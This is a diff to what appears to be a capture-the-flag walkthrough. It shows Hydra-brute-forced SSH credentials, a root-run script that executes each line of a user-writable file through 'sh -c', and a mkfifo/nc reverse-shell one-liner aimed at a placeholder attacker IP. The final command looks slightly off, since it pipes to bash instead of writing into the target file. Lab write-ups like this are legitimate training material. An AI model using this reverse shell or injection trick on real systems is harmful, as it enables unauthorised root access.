@@ -240,3 +240,25 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-22 13:53:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-22 13:53:29
 
 ## Get ssh credentials login: adrian   password: theettubrute!
+
+
+In a “/home/adrian/ftp/files” we have a two file called “.notes” and “scripts”
+
+.notes :
+
+That silly admin
+He is such a micro manager, wants me to check in every minute by writing
+on my punch card.
+He even asked me to write the script for him.
+Little does he know, I am planning my revenge.
+script :
+
+#!/bin/sh
+while read line;
+do
+  /usr/bin/sh -c "echo $line";
+done < /home/adrian/punch_in
+
+So if we insert a reverse shell inside “punch_in” file we will get reverse connection as root.
+
+echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacker-IP> <PORT> >/tmp/f” | bash
